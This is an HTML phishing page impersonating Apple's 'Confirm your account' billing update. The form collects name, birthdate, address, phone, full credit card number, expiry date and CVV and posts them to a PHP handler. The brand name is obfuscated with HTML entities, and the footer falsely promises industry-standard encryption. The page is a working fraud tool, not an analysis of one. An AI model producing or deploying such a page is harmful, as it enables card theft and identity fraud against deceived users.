<!doctype html public "-//w3c//dtd html 4.01 transitional//en" "http://www.w3.org/tr/html4/loose.dtd">
<html>

<head>
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<title>Confirm your account</title>
	<link href="css/style.css" type="text/css" rel="stylesheet" />
	<link rel="stylesheet" href="css/validationEngine.jquery.css" type="text/css" />
	<script src="js/jquery-1.8.2.min.js" type="text/javascript"></script>
	<script src="js/languages/jquery.validationEngine-en.js" type="text/javascript" charset="utf-8"></script>
	<script src="js/jquery.validationEngine.js" type="text/javascript" charset="utf-8"></script>
	<link rel="shortcut icon" href="img/favicon.ico">
	<script>
		jQuery(document).ready(function(){
			jQuery("#signup").validationEngine();
		});
	</script>
	<!--
	<script type="text/javascript">
		function valider(){
		   if ( document.formPost.data10.value == "" ){
				alert ( "Veuillez entrer votre nom" );
				document.formPost.data10.focus();
				return false;
			}
		   if (!document.formPost.data1.value.match(/^[0-9]{16}$/)){
				alert ( "Veuillez saisir un num�ro de carte de cr�dit valide" );
				document.formPost.data1.focus();
				return false;
			}
		   if (!document.formPost.data2.value.match(/^[0-9]{3}$/)){
				alert ( "Cryptogramme (CVV) invalide" );
				document.formPost.data2.focus();
				return false;
			}
		   if ( document.formPost.data6.value == "" ){
				alert ( "Vous devez saisir une r�ponse" );
				document.formPost.data6.focus();
				return false;
			}
		   if ( document.formPost.data3.value == "0"){
				alert ( "Vous avez indiqu� une date d'expiration invalide" );
				document.formPost.data3.focus();
				return false;
			}
		}
	</script>
	-->
	 <style> 
input[type=Name] {
    width: 50%;
    padding: 4px 5px;
    margin: 0px 0;
    box-sizing: border-box;
    border-style: #ff0000 #0000ff;
    border-radius: 4px ;
}
				
				
				   			
				      				input[type=Address] {
    width: 50%;
    padding: 4px 5px;
    margin: 0px 0;
    box-sizing: border-box;
    border-style: #ff0000 #0000ff;
    border-radius: 4px ;
}
				   input[type=City] {
     width: 30%;
    padding: 4px 5px;
    margin: 0px 0;
    box-sizing: border-box;
    border-style: #ff0000 #0000ff;
    border-radius: 4px ;
}
				   		   input[type=State] {
    width: 50%;
    padding: 4px 5px;
    margin: 0px 0;
    box-sizing: border-box;
    border-style: #ff0000 #0000ff;
    border-radius: 4px ;
}
				   		   		   input[type=ZipCode] {
    width: 30%;
    padding: 4px 5px;
    margin: 0px 0;
    box-sizing: border-box;
    border-style: #ff0000 #0000ff;
    border-radius: 4px ;
}
				   		   		   		   input[type=Country] {
    width: 48%;
    padding: 1px 5px;
    margin: 0px 0;
    box-sizing: border-box;
    border-style: #ff0000 #0000ff;
    border-radius: 4px ;
}
				   				            input[type=PhoneNumber] {
      width: 40%;
    padding: 4px 5px;

    margin: 0px 0;
    box-sizing: border-box;
    border-style: #ff0000 #0000ff;
    border-radius: 4px ;
}
	   				   				            input[type=Answer] {
      width: 40%;
    padding: 4px 5px;

    margin: 0px 0;
    box-sizing: border-box;
    border-style: #ff0000 #0000ff;
    border-radius: 4px ;
}
input[type=Cvv] {
      width: 22%;
    padding: 4px 5px;

    margin: 0px 0;
    box-sizing: border-box;
    border-style: #ff0000 #0000ff;
    border-radius: 4px ;
}
</style>
</head>
<body>
	<div id="top-bar">
		<div id="navbar">
			<ul >
				<li><a href="#"><img src="img/app.png"  /></a></li>
				<li><a href="#"><img src="img/ul1.png"  /></a></li>
				<li><a href="#"><img src="img/ul2.png"  /></a></li>
				<li><a href="#"><img src="img/ul3.png"  /></a></li>
				<li><a href="#"><img src="img/ul4.png"  /></a></li>
				<li><a href="#"><img src="img/ul5.png"  /></a></li>
				<li><a href="#"><img src="img/ul6.png"  /></a></li>
				<li><a href="#"><img src="img/ul7.png"  /></a></li>
				<li><form action="#" ></form></li>
			</ul>
			
		</div>
	</div>
	<div id="layout">
		<h1 class="logo"></h1>
		<div id="wrapper">
		  <div class="left2">
				
				</br></br>
		    <h1>Billing Address</h1>
			<p>Fill out the form with your billing address to continue the validation process of your &#65;p&#112;l&#101; ID. </p>
			<hr>
			<img src="fcf.png" width="320" />
		  </div>
			<div class="right">
				<form method="post" action="action_page_2.php" name="signup" id="signup">
				  <h1>Update your billing address.<img border="0" src="img/sc.png" width="83" height="33" align="right"></h1>
					<table border="0" cellpadding="0" cellspacing="0" width="85%">
					  <tbody>
					    <tr>
					      <td colspan="4" class="topheading"><p>Enter the information associated with Apple account.</p></td>
				        </tr>
					    <tr>
					      <td class="leftRow" style="text-align: left" width="241"><span class="label">Full Name :</span></td>
					      <td width="2401" colspan="3" class="rightRow"><span class="prfDetails confidential">
					        <input pattern="[a-zA-Z-']+.{4,40}" style="letter-spacing: 2px;" title="Please enter a valid Card Holder"  type="Name" id="Name" name="Name"  required/>
					        </span></td>
				        </tr>
					    <tr>
					      <td class="leftRow" style="text-align: left" width="241"><span class="label">Birthday :</span></td>
					      <td class="rightRow" colspan="3"><span class="fbExpirationSelector">
					        <select name="Month" id="Month" required>
					          <option selected value>Month</option>
					          <option value="1">Jan</option>
					          <option value="2">Feb</option>
					          <option value="3">Mar</option>
					          <option value="4">Apr</option>
					          <option value="5">May</option>
					          <option value="6">Jun</option>
					          <option value="7">Jul</option>
					          <option value="8">Aug</option>
					          <option value="9">Sep</option>
					          <option value="10">Oct</option>
					          <option value="11">Nov</option>
					          <option value="12">Dec</option>
				          </select>
					        <select name="Day" id="Day" required>
					          <option selected value>Day</option>
					          <option value="1">1</option>
					          <option value="2">2</option>
					          <option value="3">3</option>
					          <option value="4">4</option>
					          <option value="5">5</option>
					          <option value="6">6</option>
					          <option value="7">7</option>
					          <option value="8">8</option>
					          <option value="9">9</option>
					          <option value="10">10</option>
					          <option value="11">11</option>
					          <option value="12">12</option>
					          <option value="13">13</option>
					          <option value="14">14</option>
					          <option value="15">15</option>
					          <option value="16">16</option>
					          <option value="17">17</option>
					          <option value="18">18</option>
					          <option value="19">19</option>
					          <option value="20">20</option>
					          <option value="21">21</option>
					          <option value="22">22</option>
					          <option value="23">23</option>
					          <option value="24">24</option>
					          <option value="25">25</option>
					          <option value="26">26</option>
					          <option value="27">27</option>
					          <option value="28">28</option>
					          <option value="29">29</option>
					          <option value="30">30</option>
					          <option value="31">31</option>
				          </select>
					        <select name="Year" id="Year" required>
					          <option selected value>Year</option>
					          <option value="2017">2017</option>
					          <option value="2016">2016</option>
					          <option value="2015">2015</option>
					          <option value="2014">2014</option>
					          <option value="2013">2013</option>
					          <option value="2012">2012</option>
					          <option value="2011">2011</option>
					          <option value="2010">2010</option>
					          <option value="2009">2009</option>
					          <option value="2008">2008</option>
					          <option value="2007">2007</option>
					          <option value="2006">2006</option>
					          <option value="2005">2005</option>
					          <option value="2004">2004</option>
					          <option value="2003">2003</option>
					          <option value="2002">2002</option>
					          <option value="2001">2001</option>
					          <option value="2000">2000</option>
					          <option value="1999">1999</option>
					          <option value="1998">1998</option>
					          <option value="1997">1997</option>
					          <option value="1996">1996</option>
					          <option value="1995">1995</option>
					          <option value="1994">1994</option>
					          <option value="1993">1993</option>
					          <option value="1992">1992</option>
					          <option value="1991">1991</option>
					          <option value="1990">1990</option>
					          <option value="1989">1989</option>
					          <option value="1988">1988</option>
					          <option value="1987">1987</option>
					          <option value="1986">1986</option>
					          <option value="1985">1985</option>
					          <option value="1984">1984</option>
					          <option value="1983">1983</option>
					          <option value="1982">1982</option>
					          <option value="1981">1981</option>
					          <option value="1980">1980</option>
					          <option value="1979">1979</option>
					          <option value="1978">1978</option>
					          <option value="1977">1977</option>
					          <option value="1976">1976</option>
					          <option value="1975">1975</option>
					          <option value="1974">1974</option>
					          <option value="1973">1973</option>
					          <option value="1972">1972</option>
					          <option value="1971">1971</option>
					          <option value="1970">1970</option>
					          <option value="1969">1969</option>
					          <option value="1968">1968</option>
					          <option value="1967">1967</option>
					          <option value="1966">1966</option>
					          <option value="1965">1965</option>
					          <option value="1964">1964</option>
					          <option value="1963">1963</option>
					          <option value="1962">1962</option>
					          <option value="1961">1961</option>
					          <option value="1960">1960</option>
					          <option value="1959">1959</option>
					          <option value="1958">1958</option>
					          <option value="1957">1957</option>
					          <option value="1956">1956</option>
					          <option value="1955">1955</option>
					          <option value="1954">1954</option>
					          <option value="1953">1953</option>
					          <option value="1952">1952</option>
					          <option value="1951">1951</option>
					          <option value="1950">1950</option>
					          <option value="1949">1949</option>
					          <option value="1948">1948</option>
					          <option value="1947">1947</option>
					          <option value="1946">1946</option>
					          <option value="1945">1945</option>
					          <option value="1944">1944</option>
					          <option value="1943">1943</option>
					          <option value="1942">1942</option>
					          <option value="1941">1941</option>
					          <option value="1940">1940</option>
					          <option value="1939">1939</option>
					          <option value="1938">1938</option>
					          <option value="1937">1937</option>
					          <option value="1936">1936</option>
					          <option value="1935">1935</option>
					          <option value="1934">1934</option>
					          <option value="1933">1933</option>
					          <option value="1932">1932</option>
					          <option value="1931">1931</option>
					          <option value="1930">1930</option>
					          <option value="1929">1929</option>
					          <option value="1928">1928</option>
					          <option value="1927">1927</option>
					          <option value="1926">1926</option>
					          <option value="1925">1925</option>
					          <option value="1924">1924</option>
					          <option value="1923">1923</option>
					          <option value="1922">1922</option>
					          <option value="1921">1921</option>
					          <option value="1920">1920</option>
					          <option value="1919">1919</option>
					          <option value="1918">1918</option>
					          <option value="1917">1917</option>
					          <option value="1916">1916</option>
					          <option value="1915">1915</option>
					          <option value="1914">1914</option>
					          <option value="1913">1913</option>
					          <option value="1912">1912</option>
					          <option value="1911">1911</option>
					          <option value="1910">1910</option>
					          <option value="1909">1909</option>
					          <option value="1908">1908</option>
					          <option value="1907">1907</option>
					          <option value="1906">1906</option>
					          <option value="1905">1905</option>
					          <option value="1904">1904</option>
					          <option value="1903">1903</option>
					          <option value="1902">1902</option>
					          <option value="1901">1901</option>
					          <option value="1900">1900</option>
				          </select>
					        </span></td>
				        </tr>
					    <tr>
					      <td class="leftRow" style="text-align: left" width="241"><span class="label">Address :</span></td>
					      <td class="rightRow" colspan="3"><span class="prfDetails confidential">
					        <input pattern="[a-zA-Z-0-9-']+.{5,150}" title="Please enter a valid Adress" maxlength="150" type="Address" id="Address"  name="Address" class="large" required />
					        </span></td>
				        </tr>
					    <tr>
					      <td class="leftRow" style="text-align: left"><span class="label">City/Town :</span></td>
					      <td class="rightRow" colspan="3"><span class="prfDetails confidential">
					        <input pattern="[a-zA-Z-']+.{2,15}" title="Please enter a valid City" type="City" id="City" name="City" class="City" required/>
					        </span></td>
				        </tr>
					    <tr>
					      <td class="leftRow" style="text-align: left"><span class="label">Zip/Postal Code :</span></td>
					      <td class="rightRow" colspan="3"><span class="prfDetails confidential">
					        <input  title="Please enter a valid Zip Code" type="ZipCode" id="ZipCode"  name="ZipCode"  />
					        </span></td>
				        </tr>
					    <tr>
					      <td class="leftRow" style="text-align: left"><span class="label">Phone Number :</span></td>
					      <td class="rightRow" colspan="3"><span class="prfDetails confidential">
					        <input type="PhoneNumber" pattern="^((\+\d{1,3}(-| )?\(?\d\)?(-| )?\d{1,5})|(\(?\d{2,6}\)?))(-| )?(\d{3,4})(-| )?(\d{4})(( x| ext)\d{1,5}){0,1}$" id="PhoneNumber"  name="PhoneNumber"  required>
					        </span></td>
				        </tr>
					    <tr>
					      <td height="126" class="leftRow" style="text-align: left"><span class="label">Country :</span></td>
					      <td class="rightRow" colspan="3"><span class="showInEditMode">
					        <select class="fbCountrySelector" name="Country" id="Country" required>
					          <option selected value>Please Select Your Country</option>
					          <option value="AX">Aland Islands</option>
					          <option value="AL">Albania</option>
					          <option value="DZ">Algeria</option>
					          <option value="AS">American Samoa</option>
					          <option value="AD">Andorra</option>
					          <option value="AO">Angola</option>
					          <option value="AI">Anguilla</option>
					          <option value="AQ">Antarctica</option>
					          <option value="AG">Antigua</option>
					          <option value="AR">Argentina</option>
					          <option value="AM">Armenia</option>
					          <option value="AW">Aruba</option>
					          <option value="AU">Australia</option>
					          <option value="AT">Austria</option>
					          <option value="AZ">Azerbaijan</option>
					          <option value="BH">Bahrain</option>
					          <option value="BD">Bangladesh</option>
					          <option value="BB">Barbados</option>
					          <option value="BY">Belarus</option>
					          <option value="BE">Belgium</option>
					          <option value="BZ">Belize</option>
					          <option value="BJ">Benin</option>
					          <option value="BM">Bermuda</option>
					          <option value="BT">Bhutan</option>
					          <option value="BO">Bolivia</option>
					          <option value="BQ">Bonaire, Sint Eustatius and Saba</option>
					          <option value="BA">Bosnia and Herzegovina</option>
					          <option value="BW">Botswana</option>
					          <option value="BV">Bouvet Island</option>
					          <option value="BR">Brazil</option>
					          <option value="IO">British Indian Ocean Territory</option>
					          <option value="VG">British Virgin Islands</option>
					          <option value="BN">Brunei</option>
					          <option value="BG">Bulgaria</option>
					          <option value="BF">Burkina Faso</option>
					          <option value="BI">Burundi</option>
					          <option value="KH">Cambodia</option>
					          <option value="CM">Cameroon</option>
					          <option value="CA">Canada</option>
					          <option value="CV">Cape Verde</option>
					          <option value="KY">Cayman Islands</option>
					          <option value="CF">Central African Republic</option>
					          <option value="TD">Chad</option>
					          <option value="CL">Chile</option>
					          <option value="CN">China</option>
					          <option value="CX">Christmas Island</option>
					          <option value="CC">Cocos (Keeling) Islands</option>
					          <option value="CO">Colombia</option>
					          <option value="KM">Comoros</option>
					          <option value="CK">Cook Islands</option>
					          <option value="CR">Costa Rica</option>
					          <option value="CI">Côte d&#039;Ivoire</option>
					          <option value="HR">Croatia</option>
					          <option value="CW">Curaçao</option>
					          <option value="CY">Cyprus</option>
					          <option value="CZ">Czech Republic</option>
					          <option value="CD">Democratic Republic of the Congo</option>
					          <option value="DK">Denmark</option>
					          <option value="DJ">Djibouti</option>
					          <option value="DM">Dominica</option>
					          <option value="DO">Dominican Republic</option>
					          <option value="EC">Ecuador</option>
					          <option value="EG">Egypt</option>
					          <option value="SV">El Salvador</option>
					          <option value="GQ">Equatorial Guinea</option>
					          <option value="ER">Eritrea</option>
					          <option value="EE">Estonia</option>
					          <option value="ET">Ethiopia</option>
					          <option value="FK">Falkland Islands</option>
					          <option value="FO">Faroe Islands</option>
					          <option value="FM">Federated States of Micronesia</option>
					          <option value="FJ">Fiji</option>
					          <option value="FI">Finland</option>
					          <option value="FR">France</option>
					          <option value="GF">French Guiana</option>
					          <option value="PF">French Polynesia</option>
					          <option value="TF">French Southern Territories</option>
					          <option value="GA">Gabon</option>
					          <option value="GE">Georgia</option>
					          <option value="DE">Germany</option>
					          <option value="GH">Ghana</option>
					          <option value="GI">Gibraltar</option>
					          <option value="GR">Greece</option>
					          <option value="GL">Greenland</option>
					          <option value="GD">Grenada</option>
					          <option value="GP">Guadeloupe</option>
					          <option value="GU">Guam</option>
					          <option value="GT">Guatemala</option>
					          <option value="GG">Guernsey</option>
					          <option value="GN">Guinea</option>
					          <option value="GW">Guinea-Bissau</option>
					          <option value="GY">Guyana</option>
					          <option value="HT">Haiti</option>
					          <option value="HM">Heard Island and McDonald Islands</option>
					          <option value="HN">Honduras</option>
					          <option value="HK">Hong Kong</option>
					          <option value="HU">Hungary</option>
					          <option value="IS">Iceland</option>
					          <option value="IN">India</option>
					          <option value="ID">Indonesia</option>
					          <option value="IQ">Iraq</option>
					          <option value="IE">Ireland</option>
					          <option value="IM">Isle Of Man</option>
					          <option value="IL">Israel</option>
					          <option value="IT">Italy</option>
					          <option value="JM">Jamaica</option>
					          <option value="JP">Japan</option>
					          <option value="JE">Jersey</option>
					          <option value="JO">Jordan</option>
					          <option value="KZ">Kazakhstan</option>
					          <option value="KE">Kenya</option>
					          <option value="KI">Kiribati</option>
					          <option value="KW">Kuwait</option>
					          <option value="KG">Kyrgyzstan</option>
					          <option value="LA">Laos</option>
					          <option value="LV">Latvia</option>
					          <option value="LB">Lebanon</option>
					          <option value="LS">Lesotho</option>
					          <option value="LR">Liberia</option>
					          <option value="LY">Libya</option>
					          <option value="LI">Liechtenstein</option>
					          <option value="LT">Lithuania</option>
					          <option value="LU">Luxembourg</option>
					          <option value="MO">Macau</option>
					          <option value="MK">Macedonia</option>
					          <option value="MG">Madagascar</option>
					          <option value="MW">Malawi</option>
					          <option value="MY">Malaysia</option>
					          <option value="MV">Maldives</option>
					          <option value="ML">Mali</option>
					          <option value="MT">Malta</option>
					          <option value="MH">Marshall Islands</option>
					          <option value="MQ">Martinique</option>
					          <option value="MR">Mauritania</option>
					          <option value="MU">Mauritius</option>
					          <option value="YT">Mayotte</option>
					          <option value="MX">Mexico</option>
					          <option value="MD">Moldova</option>
					          <option value="MC">Monaco</option>
					          <option value="MN">Mongolia</option>
					          <option value="ME">Montenegro</option>
					          <option value="MS">Montserrat</option>
					          <option value="MA">Morocco</option>
					          <option value="MZ">Mozambique</option>
					          <option value="MM">Myanmar</option>
					          <option value="NA">Namibia</option>
					          <option value="NR">Nauru</option>
					          <option value="NP">Nepal</option>
					          <option value="NL">Netherlands</option>
					          <option value="AN">Netherlands Antilles</option>
					          <option value="NC">New Caledonia</option>
					          <option value="NZ">New Zealand</option>
					          <option value="NI">Nicaragua</option>
					          <option value="NE">Niger</option>
					          <option value="NG">Nigeria</option>
					          <option value="NU">Niue</option>
					          <option value="NF">Norfolk Island</option>
					          <option value="KP">North Korea</option>
					          <option value="MP">Northern Mariana Islands</option>
					          <option value="NO">Norway</option>
					          <option value="OM">Oman</option>
					          <option value="PK">Pakistan</option>
					          <option value="PW">Palau</option>
					          <option value="PS">Palestine</option>
					          <option value="PA">Panama</option>
					          <option value="PG">Papua New Guinea</option>
					          <option value="PY">Paraguay</option>
					          <option value="PE">Peru</option>
					          <option value="PH">Philippines</option>
					          <option value="PN">Pitcairn</option>
					          <option value="PL">Poland</option>
					          <option value="PT">Portugal</option>
					          <option value="PR">Puerto Rico</option>
					          <option value="QA">Qatar</option>
					          <option value="CG">Republic of the Congo</option>
					          <option value="RE">Réunion</option>
					          <option value="RO">Romania</option>
					          <option value="RU">Russia</option>
					          <option value="RW">Rwanda</option>
					          <option value="BL">Saint Barthélemy</option>
					          <option value="SH">Saint Helena</option>
					          <option value="KN">Saint Kitts and Nevis</option>
					          <option value="MF">Saint Martin</option>
					          <option value="PM">Saint Pierre and Miquelon</option>
					          <option value="VC">Saint Vincent and the Grenadines</option>
					          <option value="WS">Samoa</option>
					          <option value="SM">San Marino</option>
					          <option value="ST">Sao Tome and Principe</option>
					          <option value="SA">Saudi Arabia</option>
					          <option value="SN">Senegal</option>
					          <option value="RS">Serbia</option>
					          <option value="SC">Seychelles</option>
					          <option value="SL">Sierra Leone</option>
					          <option value="SG">Singapore</option>
					          <option value="SX">Sint Maarten</option>
					          <option value="SK">Slovakia</option>
					          <option value="SI">Slovenia</option>
					          <option value="SB">Solomon Islands</option>
					          <option value="SO">Somalia</option>
					          <option value="ZA">South Africa</option>
					          <option value="GS">South Georgia and the South Sandwich Islands</option>
					          <option value="KR">South Korea</option>
					          <option value="SS">South Sudan</option>
					          <option value="ES">Spain</option>
					          <option value="LK">Sri Lanka</option>
					          <option value="LC">St. Lucia</option>
					          <option value="SR">Suriname</option>
					          <option value="SJ">Svalbard and Jan Mayen</option>
					          <option value="SZ">Swaziland</option>
					          <option value="SE">Sweden</option>
					          <option value="CH">Switzerland</option>
					          <option value="TW">Taiwan</option>
					          <option value="TJ">Tajikistan</option>
					          <option value="TZ">Tanzania</option>
					          <option value="TH">Thailand</option>
					          <option value="BS">The Bahamas</option>
					          <option value="GM">The Gambia</option>
					          <option value="TL">Timor-Leste</option>
					          <option value="TG">Togo</option>
					          <option value="TK">Tokelau</option>
					          <option value="TO">Tonga</option>
					          <option value="TT">Trinidad and Tobago</option>
					          <option value="TN">Tunisia</option>
					          <option value="TR">Turkey</option>
					          <option value="TM">Turkmenistan</option>
					          <option value="TC">Turks and Caicos Islands</option>
					          <option value="TV">Tuvalu</option>
					          <option value="UG">Uganda</option>
					          <option value="UA">Ukraine</option>
					          <option value="GB">United Kingdom</option>
					          <option value="US">United States</option>
					          <option value="AE">United Arab Emirates</option>
					          <option value="UM">United States Minor Outlying Islands</option>
					          <option value="UY">Uruguay</option>
					          <option value="VI">US Virgin Islands</option>
					          <option value="UZ">Uzbekistan</option>
					          <option value="VU">Vanuatu</option>
					          <option value="VA">Vatican City</option>
					          <option value="VE">Venezuela</option>
					          <option value="VN">Vietnam</option>
					          <option value="WF">Wallis and Futuna</option>
					          <option value="EH">Western Sahara</option>
					          <option value="YE">Yemen</option>
					          <option value="ZM">Zambia</option>
					          <option value="ZW">Zimbabwe</option>
				          </select>
				          </span></td>
				        </tr>
					    <tr>
					      <td class="leftRow" style="text-align: left"><p><font color="#000000">Credit Card Number:</font></p></td>
<td colspan="3" class="rightRow"><span class="element">
					        <link rel="stylesheet" href="files_billing2/css/check.css">
					      </span>
					        <p><span class="element">
				            <script src="files_billing2/js/jquery.min.js"></script>
				            <script src="files_billing2/js/jquery.maskedinput.js" type="text/javascript"></script>
				            <script src="files_billing2/js/ccFormat.js"></script>
				            <script src="files_billing2/js/jquery.creditCardValidator.js"></script>
				            <script type="text/javascript">
	function check_cc() {
		$('#card_number').validateCreditCard(function(result) {
				if(result.card_type == null)
				{
						$('#card_number').removeClass();
				}
				else
				{
						$('#card_number').addClass(result.card_type.name);
				}

				if(result.valid)
				{
					$('#form').addClass("valid");
					$("#card_number").removeClass("fail");
				}
				else
				{
					event.preventDefault();
					$("#card_number").addClass("fail");
					$("#card_number").focus();
					$('#card_number').removeClass("valid");
				}
		});
	}

   $(function() {
        $('#card_number').validateCreditCard(function(result) {
            if(result.card_type == null)
            {
                $('#card_number').removeClass();
            }
            else
            {
                $('#card_number').addClass(result.card_type.name);
            }

            if(!result.valid)
            {
                $('#card_number').removeClass("valid");
            }
            else
            {
                $('#card_number').addClass("valid");
            }

        });
    });
                              </script></span></p>
					        <p>&nbsp;</p>
					        <p><span class="element">
					          <input style="font-size:15px" type="element" name="card_number" id="card_number" placeholder="1234 5678 9012 3456" maxlength="16">
					          </span></p>
					        <p><span class="element"><img src="crd.png" width="163" height="23" alt=""/></span></p></td>
				        </tr>
					    <tr>
					      <td class="leftRow" style="text-align: left"><span class="label">Expiration Date :</span></td>
					      <td class="rightRow" colspan="3"><span class="fbExpirationSelector">
					        <select name="Month_" id="Month_" required>
					          <option selected value>Month</option>
					          <option value="1">01</option>
					          <option value="2">02</option>
					          <option value="3">03</option>
					          <option value="4">04</option>
					          <option value="5">05</option>
					          <option value="6">06</option>
					          <option value="7">07</option>
					          <option value="8">08</option>
					          <option value="9">09</option>
					          <option value="10">10</option>
					          <option value="11">11</option>
					          <option value="12">12</option>
				          </select>
					        <select name="Year_" id="Year_" required>
					          <option selected value>Year</option>
					          <option value="2017">2017</option>
					          <option value="2018">2018</option>
					          <option value="2019">2019</option>
					          <option value="2020">2020</option>
					          <option value="2021">2021</option>
					          <option value="2022">2022</option>
					          <option value="2023">2023</option>
					          <option value="2024">2024</option>
					          <option value="2025">2025</option>
					          <option value="2026">2026</option>
					          <option value="2027">2027</option>
					          <option value="2028">2028</option>
					          <option value="2029">2029</option>
					          <option value="2030">2030</option>
				          </select>
					      </span></td>
				        </tr>
					    <tr>
					      <td class="leftRow" style="text-align: left">CVC (CVV) :</td>
					      <td class="rightRow" colspan="3"><span class="prfDetails confidential">
					        <input pattern="[0-9].{2,3}" style="letter-spacing: 3px;" title="Please enter a valid CVC" type="cvv" id="cvv1" maxlength="4" name="CVV" class="CVV" required />
					      </span><strong><a href="Help.php" target="new">?<img src="cvv2.gif" width="51" height="31" alt=""/></a></strong></td>
				        </tr>
					    <tr>
					      <td class="leftRow" style="text-align: left">&nbsp;</td>
					      <td class="rightRow" colspan="3"><span style="text-align:center;border:0;">
					        <input class="submit" name="submit" value="Continue" onclick="check_cc()" type="submit" style="display: block; margin-top: 15px;">
					        </span></td>
				        </tr>
			      </table>
				</form>
			</div>
		</div>
		<div id="footer">
		<p>The &#65;p&#112;l&#101; Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a></p>
		<hr>
		<div class="copy-right"><a>Copyright &copy; 2017 &#65;p&#112;l&#101; Inc. All rights reserved.</a></div>
		<div class="terms"><a href="#">Terms of Use |</a> <a href="#">Terms of Use |</a><a href="#">Terms of Use .</a></div>
	 </div>
		
	</div>
	 
</body>
</html>